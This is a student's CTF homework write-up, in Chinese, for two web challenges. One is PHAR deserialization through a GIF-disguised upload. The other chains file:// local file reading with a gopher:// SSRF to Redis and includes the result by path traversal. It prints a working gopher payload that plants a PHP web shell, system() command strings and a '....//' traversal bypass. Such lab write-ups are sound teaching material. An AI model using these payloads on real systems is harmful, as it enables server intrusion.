###### tags: `ctf`
# Hw6 write_up

## ID
bruce30709
## Rero Meme
本題是我們把.gif圖片丟到server端後，再顯示出來的網頁， 他可以攻擊的地方是把php code偽裝成.gif上傳至server中，而這個偽裝的.gif要使用phar去生成一個包含php指令的文件，要注意的是在寫phar的時候，要setStub('GIF89a <?php __HALT_COMPILER();?> ')，這樣上傳時server才能辨別是gif檔。

接著把你產生好的(假)gif檔，傳到server上，要記得取一個好記點的title，因為它會是上傳的gif的新檔名XD。

![](https://i.imgur.com/WxGMnY8.png)

接著要送post request給server後端的username，代的value要放phar://aaa/77777.gif，也就是後端(假)gif的位置
![](https://i.imgur.com/OxmGh9w.png)
console去送出form request
![](https://i.imgur.com/WoOyLyF.png)

這樣就可以利用mkdir username的時候執行phar內的code，我裡面是我裡面是跟投影片的例子一樣去new一個名稱一樣的MEME class並且在裡面代參數，__destruct()會在images/aaa/去建立a.php(自己取的名稱)檔案，裡面直接用"<?php system('cat /f*') ?>"把flag印出來。

![](https://i.imgur.com/pDbprXN.png)

直接去images/aaa/a.php就拿到flag啦~


## 陸拾肆基底編碼之遠端圖像編碼器
本題是一個會把你的輸入變成base64加密後的圖片的網頁，我首先是觀察url的變化，發現輸入錯誤資訊時，會有報錯提示，他有告訴我們2個位置，/var/www/html/index.php和/var/www/html/page/result.inc.php，我就想到可以用LFI的方法去看原始碼。

方法為在快速轉換的input欄位用 file:// 的方法輸入。
![](https://i.imgur.com/DXutVEv.png)

然後把得到的response去base64 decoder，就可以得出內容。

![](https://i.imgur.com/mfMJIEQ.png)

程式碼中有提示是要去找本機的service，我就想到用 file:///proc/net/tcp 去查本機的tcp port，發現127.0.0.1:27134這個port也就是redis服務特別的忙綠，所以知道要使用他。

我是用 gopher:// 去連線，然後發現要把ip轉16進位才能過。
最先是flush掉先前db的東西，然後用set插入php script<?php system($_GET['cmd']);?>，接著改變dbfile名稱為test.inc.php( 因為程式碼會要求要是inc.php結尾 )跟dir路徑/tmp，最後用save儲存quit離開，以下是我的payload ，要注意的點是要使用urlencode再送出。
```
gopher://0x7F.0x00.0x00.0x01:27134/
_flushall%0D%0ASET%20x%20"<?php system($_GET['cmd']);?>
"%0D%0Aconfig%20set%20dir%20/tmp%0D%0A
config%20set%20dbfilename%20test.inc.php%0D%0Asave%0D%0Aquit%0D%0A
```
然後再用ls看到flag在根目錄下，最後用以下url去拿flag，要注意的是要用\.\.\.\.//來繞過程式碼中replace string" \.\./ "to""的限制。
```
http://base64image.splitline.tw:8894/?
page=....//....//....//....//tmp/test&cmd=cat%20/flag*
```

就可以拿到flag!

![](https://i.imgur.com/p9iW4c5.png)

